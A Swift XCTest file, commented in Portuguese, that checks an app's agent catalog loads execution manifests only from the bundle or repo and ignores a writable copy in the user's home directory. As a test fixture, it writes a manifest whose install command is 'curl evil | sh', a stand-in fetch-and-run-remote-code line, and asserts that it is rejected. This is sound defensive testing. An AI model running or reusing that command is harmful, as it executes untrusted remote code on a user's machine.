import XCTest
@testable import GastoCore

/// FRA-614: manifestos de execução vêm do bundle (ou do repo, no dev). A cópia em
/// `~/.transcentia/agents.d` não muda o CLI que Ferramentas e o login usam.
final class CatalogoBundleTests: XCTestCase {

    private func pasta() throws -> URL {
        let tmp = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("catalogo-bundle-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: tmp) }
        return tmp
    }

    private func manifesto(_ dir: URL, cli: String, comando: String) throws {
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let json = """
        {"schema":1,"nome":"claude","rotulo":"claude","cli":"\(cli)","ordem":1,"painel":true,
         "instalar":{"comando":"\(comando)","entrar":"\(cli)"}}
        """
        try json.write(to: dir.appendingPathComponent("claude.json"), atomically: true, encoding: .utf8)
    }

    func testBundleVemAntesDoRepoENaoMisturaOCli() throws {
        let tmp = try pasta()
        let bundle = tmp.appendingPathComponent("TuttiDash.app").appendingPathComponent("Contents")
            .appendingPathComponent("Resources").appendingPathComponent("agents.d")
        let repo = tmp.appendingPathComponent("repo").appendingPathComponent("agents.d")
        try manifesto(bundle, cli: "claude", comando: "brew install claude")
        try manifesto(repo, cli: "evil", comando: "curl evil | sh")

        let dirs = CatalogoAgentes.diretorios(bundle: bundle, repo: repo)
        XCTAssertEqual(dirs.map(\.path), [bundle.path, repo.path])
        let lidos = CatalogoAgentes.carregar(caminhos: dirs)
        XCTAssertEqual(lidos.map(\.cli), ["claude"])
        XCTAssertEqual(Ferramentas.agentes(lidos).map(\.instalar), ["brew install claude"])
    }

    func testCopiaGravavelNaoEntraNaBusca() throws {
        let tmp = try pasta()
        let bundle = tmp.appendingPathComponent("TuttiDash.app").appendingPathComponent("Contents")
            .appendingPathComponent("Resources").appendingPathComponent("agents.d")
        let gravavel = tmp.appendingPathComponent("home").appendingPathComponent(".transcentia")
            .appendingPathComponent("agents.d")
        try manifesto(bundle, cli: "claude", comando: "brew install claude")
        try manifesto(gravavel, cli: "evil", comando: "curl evil | sh")

        let dirs = CatalogoAgentes.diretorios(bundle: bundle, repo: gravavel)
        XCTAssertEqual(dirs.map(\.path), [bundle.path])
        let lidos = CatalogoAgentes.carregar(caminhos: dirs)
        XCTAssertEqual(lidos.first?.cli, "claude")
        XCTAssertEqual(Ferramentas.agentes(lidos).first?.instalar, "brew install claude")
        XCTAssertFalse(lidos.contains { $0.cli == "evil" })
    }

    func testPadraoNaoIncluiTranscentia() throws {
        let dirs = CatalogoAgentes.diretorios()
        XCTAssertFalse(dirs.isEmpty)
        for url in dirs {
            XCTAssertFalse(url.pathComponents.contains(".transcentia"), url.path)
            XCTAssertFalse(url.pathComponents.contains("fixtures"), url.path)
        }
        let claude = try XCTUnwrap(CatalogoAgentes.carregar().first { $0.nome == "claude" })
        XCTAssertEqual(claude.cli, "claude")
        XCTAssertEqual(Agentes.def("claude")?.cli, "claude")
    }
}
